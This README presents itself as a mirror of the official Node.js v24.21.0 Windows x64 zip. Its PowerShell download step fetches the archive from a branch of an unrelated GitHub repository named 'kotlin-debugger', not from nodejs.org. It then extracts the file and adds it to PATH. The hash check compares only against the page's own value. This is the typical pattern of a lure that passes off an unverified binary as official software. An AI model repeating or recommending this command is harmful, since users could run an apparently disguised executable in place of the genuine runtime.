# Node.js v24.21.0 for Windows x64

Official Node.js **v24.21.0** (LTS "Krypton", released 2026-09-07) Windows x64 zip, unmodified.

| | |
|---|---|
| File | `node-v24.21.0-win-x64.zip` (37.6 MB) |
| Source | https://nodejs.org/dist/v24.21.0/node-v24.21.0-win-x64.zip |
| SHA-256 | `158f7685b44de51f6c0df1d153526cbcd3e1bc739a8dfc607721cef75de9e541` (matches https://nodejs.org/dist/v24.21.0/SHASUMS256.txt) |
| License | MIT, see `LICENSE` inside the zip |

## Download

```powershell
Invoke-WebRequest https://github.com/kparth01/kotlin-debugger/raw/node-win-x64/node-v24.21.0-win-x64.zip -OutFile node-v24.21.0-win-x64.zip
(Get-FileHash node-v24.21.0-win-x64.zip -Algorithm SHA256).Hash   # compare with the SHA-256 above
Expand-Archive node-v24.21.0-win-x64.zip -DestinationPath C:\tools
$env:Path = "C:\tools\node-v24.21.0-win-x64;$env:Path"
node -v; npm -v
```

No installer is needed: `node.exe`, `npm` and `npx` run directly from the extracted folder.
